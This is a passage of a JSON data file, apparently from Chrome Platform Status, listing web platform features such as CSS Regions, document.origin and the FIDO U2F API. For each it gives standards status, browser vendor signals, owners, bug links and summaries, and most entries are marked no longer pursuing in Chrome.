          "nattestad@chromium.org",
          "dschuff@chromium.org",
          "hablich@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": true,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=840415",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3228",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WebAssembly/meetings/blob/master/2017/CG-05.md#non-trapping-float-to-int",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds opcodes to WebAssembly to support non-trapping float-to-integer conversion to improve the ergonomics of the bytecode format.\r\n",
    "id": 4611843511287808,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/nontrapping-float-to-int-conversions/blob/master/proposals/nontrapping-float-to-int-conversion/Overview.md"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-24 16:34:00.563150",
      "by": "jmedley@google.com"
    },
    "name": "document.origin",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/whatwg/dom/issues/410",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": "Enabled by default"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/692084",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/whatwg/dom/issues/410#issuecomment-357170536",
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The document.origin property will be deprecated and removed in Chromium, and then likely also removed from the DOM Standard. This property was only ever implemented in Chromium and WebKit. It is redundant with self.origin which can be used in both window and worker contexts and has wider support. ",
    "id": 5701042356355072,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Document/origin"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-07-12 07:10:26.478130",
      "by": "tkent@chromium.org"
    },
    "first_of_milestone": true,
    "name": "Automatic focus by Selection interface functions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/selection-api/#selection-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Editing"
        ],
        "flag": false,
        "bug": "http://crbug.com/690272",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chromium has a behavior that functions of Selection interface automatically set focus on an element contains the new selection. This behavior isn't defined by the standard, and it is not interoperable.\r\n",
    "id": 5335417998016512,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:51.085530",
      "by": "ericbidelman@google.com"
    },
    "name": "BasicCardResponse.expiry{Month,Year} should be 2 digits",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/webpayments-methods-card/#basiccardresponse",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "rouslan@chromium.org",
          "sebsg@chromium.org",
          "zkoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "bug": "http://crbug.com/673353",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The expiryMonth field contains a two-digit string for the expiry month of the card in the range 01 to 12.\r\n\r\nThe expiryYear field contains a two-digit string for the expiry year of the card in the range 00 to 99.",
    "id": 5671972004429824,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:47.898740",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Regions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css3-regions/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://wkbug.com/57312",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/library/hh673537.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://www.webkit.org/blog/3078/advanced-layout-made-easy-with-css-regions/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Magazine-like content flow into specified regions.",
    "id": 5655612935372800,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:43.028150",
      "by": "ericbidelman@google.com"
    },
    "name": "Canvas rendering from workers",
    "comments": "This proposal has been abandoned. Intent moved to https://www.chromestatus.com/features/5424182347169792",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://wiki.whatwg.org/wiki/CanvasInWorkers",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://lists.whatwg.org/pipermail/whatwg-whatwg.org/2013-October/thread.html#41074",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "junov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/245884",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Render a Canvas object (2D or WebGL) from a web worker.",
    "id": 5610258080727040,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:49.161520",
      "by": "ericbidelman@google.com"
    },
    "name": "Canvas2D text decoration",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "junov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/245526",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add a textDecoration attribute to canvas 2D contexts, behavior similar to existing \"font\" attribute: It's a DOMString, parsed the same way as corresponding CSS property (text-decoration).",
    "id": 5663034638860288,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:34.255270",
      "by": "ericbidelman@google.com"
    },
    "name": "Comprehensions (dropped from ES6)",
    "tags": [
      "array comprehensions",
      ""
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/30#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2856",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Concise syntax for transforming collections.",
    "id": 4990451081805824,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:06.913720",
      "by": "ericbidelman@google.com"
    },
    "name": "Custom filters (shaders)",
    "comments": "Adobe removed Custom Filters code from WebKit in January 2014 due to various reasons https://lists.webkit.org/pipermail/webkit-dev/2014-January/026098.html http://trac.webkit.org/changeset/162644",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://status.modern.ie/customfiltersshaders",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Apply OpenGL shaders to arbitrary DOM elements.",
    "id": 5838406743490560,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:17.357840",
      "by": "ericbidelman@google.com"
    },
    "name": "Dart VM",
    "comments": "\"We have decided not to integrate the Dart VM into Chrome.\" http://news.dartlang.org/2015/03/dart-for-entire-web.html",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.ecma-international.org/publications/standards/Ecma-408.htm",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "sandholm@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Dart is a new web programming language with libraries, a virtual machine, and tools.  It's designed to help developers build fast, structured modern web apps.  Dart compiles to JavaScript to run across the entire modern web. The VM is a Chrome feature to optimize Dart's performance.",
    "id": 6682831673622528,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:48.255670",
      "by": "ericbidelman@google.com"
    },
    "name": "Debug API",
    "tags": [
      "debug"
    ],
    "comments": "Intent to implement:\r\nDebug.traceAsyncOperationStarting()\r\nDebug.traceAsyncOperationCompleted()\r\nDebug.traceAsyncCallbackStarting()\r\nDebug.traceAsyncCallbackCompleted()\r\n",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "aandrey@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=400784",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/bs12a9wf(v=vs.94).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Expose some Debug API to user's JavaScript code.",
    "id": 5656684127059968,
    "resources": {
      "docs": [
        "http://msdn.microsoft.com/en-us/library/ie/bs12a9wf(v=vs.94).aspx"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:14.104560",
      "by": "ericbidelman@google.com"
    },
    "name": "FIDO U2F JavaScript API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://fidoalliance.org/specs/fido-u2f-v1.0-nfc-bt-amendment-20150514/fido-u2f-javascript-api.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/blink-dev/wfIVkXvQ7kQ/phFCwuFmBwAJ",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "kpaulhamus@chromium.org",
          "juanlang@chromium.org",
          "piperc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/660458",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Web platform API to provide U2F support.\r\n",
    "id": 6413248798654464,
    "resources": {
      "samples": [
        "https://github.com/google/u2f-ref-code/"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-07 05:25:56.755260",
      "by": "ddorwin@chromium.org"
    },
    "name": "GamePad API touch and motion extensions",
    "tags": [
      "Gamepad",
      "VR controllers"
    ],
    "comments": "The `touched` attribute is now tracked as https://www.chromestatus.com/feature/5727206521176064.\r\nVR-specific inputs, including pose, are now handled by WebXR Device API: https://github.com/immersive-web/webxr/blob/master/explainer.md#input",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/gamepad/extensions.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "bajones@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=629101",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Additions to the gamepad API to enable devices with touch-sensitive controls and devices that are capable of tracking position, orientation, and/or motion. VR controllers will benefit from the new attributes, as will more traditional gamepads with these types of inputs.",
    "id": 5651469617332224,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:03.779770",
      "by": "ericbidelman@google.com"
    },
    "name": "Geofencing API",
    "comments": "early API design sketch at https://gist.github.com/mkruisselbrink/c5c5cd80f27f3158f451",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/geofencing-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "mek@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=383125",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Geofencing API is an extension of the Geolocation API allowing web applications to setup geographic boundaries around specific locations and then receive notifications when the user enters or leaves those areas.",
    "id": 5755591855177728,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-07 17:23:48.012518",
      "by": "jmedley@google.com"
    },
    "name": "Get Installed Related Apps API",
    "tags": [
      "isappinstalled",
      "isnativeappinstalled",
      "appinstalled"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "mgiuca@chromium.org",
          "owencm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Mobile>WebAPKs"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=587623",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Get Installed Related Apps API (navigator.getInstalledRelatedApps) provides sites access to if their corresponding related applications are installed. Sites are only allowed to use this API if the native application has an established association with the web origin.\r\n\r\nhttps://github.com/WICG/get-installed-related-apps",
    "id": 5695378309513216,
    "resources": {
      "docs": [
        "https://github.com/WICG/get-installed-related-apps/blob/master/EXPLAINER.md"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:40.223470",
      "by": "ericbidelman@google.com"
    },
    "name": "Intent to deprecate: PseudoBeforeAfterForInputElement",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "philwright@chromium.org",
          "nainar@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/480891",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Intent to deprecateusage of pseudo elements ::before and ::after For Input Elements as it goes against spec.",
    "id": 5393219172958208,
    "resources": {
      "docs": [
        "Refer to bug for current status.",
        "",
        "Some public discussion on not going through with he deprecation warning is here: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/_czoEgSJMQs"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:06.378270",
      "by": "ericbidelman@google.com"
    },
    "name": "Lazy layout",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "esprehn@chromium.org",
          "leviw@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support a system for doing lazy layout based on what elements are visible in the viewport.",
    "id": 5803772127215616,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-30 17:18:18.645990",
      "by": "jmedley@google.com"
    },
    "name": "Link rel=serviceworker",
    "tags": [
      "foreign fetch",
      "service worker",
      "third party"
    ],
    "comments": "This was shipped as part of the Foreign Fetch origin trial.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html#link-type-serviceworker",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1247141#c2",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "mek@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "flag": false,
        "bug": "https://crbug.com/582308",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for LINK rel=serviceworker as an element and header to allow the installation of Service Worker declarative in a document or via a header.\r\n\r\nUpdate (2018-03-26): This was removed from the specification and is no longer being pursued.",
    "id": 5682681044008960,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:14.313560",
      "by": "ericbidelman@google.com"
    },
    "name": "Microdata",
    "comments": "Never exposed to developers.\r\n\r\nhttps://groups.google.com/a/chromium.org/d/msg/blink-dev/b54nW_mGSVU/paAZR1K0JRYJ",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://whatwg.org/html#microdata-dom-api",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "esprehn@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://status.modern.ie/microdata",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Microdata is used to nest semantics within existing content on web pages.",
    "id": 6428569609699328,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:37.277170",
      "by": "ericbidelman@google.com"
    },
    "name": "Navigation Transitions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://docs.google.com/a/chromium.org/document/d/17jg1RRL3RI969cLwbKBIcoGDsPwqaEdBxafGNYGwiY4/edit?pli=1#",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "oysteine@chromium.org",
          "rschoen@chromium.org",
          "simonhatch@chromium.org",
          "tonyg@chromium.org",
          "zhenw@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/370696",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows web authors to both improve the perceived loading speed as well as provide visual polish by allowing two pages to coordinate on a transition animation (regardless of their origin).",
    "id": 5169444246519808,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-12-19 21:48:58.373940",
      "by": "chongz@chromium.org"
    },
    "name": "Offset-based Touch Adjustment",
    "tags": [
      "Touch Adjustment"
    ],
    "comments": "This is a more of an UA feature and they behave differently.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "chongz@chromium.org",
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://crbug.com/625198",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "No longer pursuing.\r\nNew plan: https://www.chromestatus.com/feature/4895751150764032\r\n---\r\nTouch Adjustment is the feature where UA attempts to select the best target underneath the finger.\r\n\r\nOffset-based Touch Adjustment will run the selecting algorithm only on TouchStart, and apply the same offset (between adjusted coordinates and original coordinates) to all following TouchMove/End as well as gesture/click events. Will run hittest for each event with adjusted coordinates.\r\n",
    "id": 5178547119325184,
    "resources": {
      "samples": [
        "https://rbyers.github.io/touchAdjustment.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-05-21 16:28:39.009260",
      "by": "zino@chromium.org"
    },
    "name": "Remove currencySystem in PaymentRequest API",
    "tags": [
      "payment",
      "PaymentRequest",
      "currency",
      "currencySystem"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/payment-request/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No longer pursuing",
          "val": 1000,
          "milestone_str": "No longer pursuing"
        },
        "owners": [
          "jinho.bang@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
